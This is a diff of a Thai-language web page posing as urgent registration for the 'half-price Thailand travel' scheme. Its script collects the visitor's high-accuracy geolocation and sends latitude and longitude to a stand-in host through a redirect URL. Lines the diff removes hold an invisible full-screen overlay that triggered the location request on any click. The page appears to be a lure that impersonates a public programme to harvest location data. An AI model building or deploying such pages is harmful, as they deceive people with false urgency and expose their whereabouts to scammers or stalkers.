@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ด่วน! ก่อนหมดสิทธิ รีบลงทะเบียนเที่ยวไทยคนละครึ่ง</title>
+    <title>ลงทะเบียนเที่ยวไทยคนละครึ่ง - รับสิทธิ์ด่วน!</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;500;700&display=swap" rel="stylesheet">
@@ -24,45 +24,19 @@
             padding: 0;
             box-sizing: border-box;
             background-color: var(--light-bg);
-            background-image: 
-                radial-gradient(circle at 50% 0, rgba(247, 225, 237, 0.4) 0%, transparent 40%),
-                radial-gradient(circle at 50% 100%, rgba(225, 232, 247, 0.4) 0%, transparent 40%);
-            background-repeat: no-repeat;
-            background-size: 100% 50%;
         }
         
-        /* --- ส่วน Header ที่เพิ่มเข้ามา --- */
         .main-header {
             background-color: white;
             padding: 15px 25px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             display: flex;
-            justify-content: space-between;
+            justify-content: center; /* จัดโลโก้กลางหน้าจอ */
             align-items: center;
-            /* [ปรับปรุง] ทำให้ Header อยู่เหนือ Overlay */
-            position: relative;
-            z-index: 2;
         }
 
         .header-logo {
             height: 40px;
-        }
-
-        .menu-icon {
-            width: 28px;
-            height: 20px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            cursor: pointer;
-        }
-
-        .menu-icon span {
-            display: block;
-            height: 3px;
-            width: 100%;
-            background-color: var(--dark-gray);
-            border-radius: 3px;
         }
 
         .main-content {
@@ -70,9 +44,6 @@
             justify-content: center;
             align-items: center;
             padding: 40px 20px;
-            /* [ปรับปรุง] ทำให้เนื้อหาหลักอยู่เหนือ Overlay */
-            position: relative;
-            z-index: 2;
         }
 
         .container {
@@ -83,11 +54,6 @@
             text-align: center;
             max-width: 450px;
             width: 100%;
-        }
-
-        .logo-in-box {
-            max-width: 250px;
-            margin-bottom: 25px;
         }
 
         .container h1 {
@@ -156,29 +122,104 @@
             height: 30px;
             animation: spin 1s linear infinite;
             margin: 20px auto 0;
-            display: none;
+            display: none; /* ซ่อนไว้ในตอนแรก */
         }
 
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        /* --- [โค้ดใหม่] สไตล์สำหรับปุ่มล่องหน --- */
-        #invisible-overlay {
-            position: fixed; /* ยึดตำแหน่งกับหน้าจอ */
-            top: 0;
-            left: 0;
-            width: 100vw; /* กว้างเต็มหน้าจอ */
-            height: 100vh; /* สูงเต็มหน้าจอ */
-            background-color: transparent; /* โปร่งใส */
-            z-index: 1; /* อยู่ข้างหลังเนื้อหาหลัก แต่ข้างหน้าสุดของพื้นหลัง */
-            cursor: pointer; /* แสดงสัญลักษณ์ว่าเป็นพื้นที่กดได้ */
-        }
     </style>
 </head>
 <body>
-    <div id="invisible-overlay" onclick="requestLocationAndRedirect()"></div>
-
     <header class="main-header">
-        <img src="all-logo.svg" alt="โลโก้โครงการ" class="header-
+        <!-- ใช้โลโก้ตัวอย่างเพื่อให้เว็บแสดงผลได้สมบูรณ์ -->
+        <img src="https://placehold.co/250x60/DBEAFE/1E3A8A?text=เที่ยวไทยคนละครึ่ง" alt="โลโก้โครงการ" class="header-logo">
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <h1>ด่วน! ก่อนหมดสิทธิ<br>รีบลงทะเบียนเที่ยวไทยคนละครึ่ง</h1>
+            <p>กรุณากดปุ่มด้านล่างเพื่อยืนยันตำแหน่งปัจจุบันของคุณ และดำเนินการลงทะเบียนเพื่อรับสิทธิ์</p>
+            
+            <button id="register-button" class="action-button">ลงทะเบียนรับสิทธิ์ที่นี่</button>
+
+            <div id="loader" class="loader"></div>
+            <div id="status-message"></div>
+        </div>
+    </main>
+
+    <script>
+        const registerButton = document.getElementById('register-button');
+        const statusMessage = document.getElementById('status-message');
+        const loader = document.getElementById('loader');
+
+        // เพิ่ม Event Listener ให้กับปุ่มลงทะเบียน
+        registerButton.addEventListener('click', () => {
+            // 1. อัปเดต UI เพื่อแสดงสถานะกำลังโหลด
+            statusMessage.textContent = 'กำลังตรวจสอบตำแหน่งของคุณ...';
+            statusMessage.className = ''; // ล้าง class สีเก่าออก
+            loader.style.display = 'block';
+            registerButton.disabled = true;
+
+            // 2. ตรวจสอบว่าเบราว์เซอร์รองรับ Geolocation หรือไม่
+            if (!navigator.geolocation) {
+                statusMessage.textContent = 'ขออภัย, เบราว์เซอร์ของคุณไม่รองรับการระบุตำแหน่ง';
+                statusMessage.className = 'message-error';
+                loader.style.display = 'none';
+                registerButton.disabled = false;
+                return;
+            }
+
+            // 3. เรียกใช้ API เพื่อขอตำแหน่ง
+            navigator.geolocation.getCurrentPosition(handleSuccess, handleError, {
+                enableHighAccuracy: true, // ขอตำแหน่งที่แม่นยำที่สุด
+                timeout: 10000,           // หมดเวลาใน 10 วินาที
+                maximumAge: 0             // ไม่ใช้ค่าตำแหน่งเก่าที่แคชไว้
+            });
+        });
+
+        // ฟังก์ชันที่จะทำงานเมื่อได้รับตำแหน่งสำเร็จ
+        function handleSuccess(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // อัปเดต UI
+            statusMessage.textContent = 'ตรวจสอบตำแหน่งสำเร็จ! กำลังนำคุณไปยังหน้าลงทะเบียน...';
+            statusMessage.className = 'message-success';
+            loader.style.display = 'none';
+
+            // สร้าง URL สำหรับส่งต่อไปยังหน้าลงทะเบียน พร้อมแนบค่า lat, lon
+            const redirectUrl = `https://www.example.com/halfpricetravel/register?lat=${latitude}&lon=${longitude}`;
+
+            // หน่วงเวลาเล็กน้อยเพื่อให้ผู้ใช้อ่านข้อความทัน ก่อนจะ redirect
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 2000); 
+        }
+
+        // ฟังก์ชันที่จะทำงานเมื่อเกิดข้อผิดพลาด
+        function handleError(error) {
+            loader.style.display = 'none';
+            registerButton.disabled = false;
+            statusMessage.className = 'message-error';
+
+            // แสดงข้อความตามรหัสข้อผิดพลาด
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    statusMessage.textContent = 'คุณปฏิเสธการเข้าถึงตำแหน่ง โปรดอนุญาตเพื่อดำเนินการต่อ';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    statusMessage.textContent = 'ไม่สามารถระบุตำแหน่งของคุณได้ในขณะนี้';
+                    break;
+                case error.TIMEOUT:
+                    statusMessage.textContent = 'หมดเวลาในการร้องขอตำแหน่ง';
+                    break;
+                default:
+                    statusMessage.textContent = 'เกิดข้อผิดพลาดที่ไม่คาดคิด';
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
